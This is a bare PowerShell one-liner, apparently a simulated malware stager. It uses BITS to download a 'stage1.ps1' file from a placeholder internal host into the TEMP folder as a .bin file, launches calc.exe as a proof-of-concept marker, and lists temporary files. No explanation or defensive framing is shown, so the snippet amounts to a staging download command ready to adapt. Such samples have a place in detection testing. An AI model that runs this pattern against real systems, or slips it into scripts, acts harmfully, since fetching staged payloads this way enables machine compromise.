
$Stage1Url = 'https://internal.corp/stage1.ps1'; $LocalPath = "$env:TEMP\stage1.bin"; $TimeoutSec = 173; Start-BitsTransfer -Source $Stage1Url -Destination $LocalPath; Start-Process -FilePath "calc.exe"; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
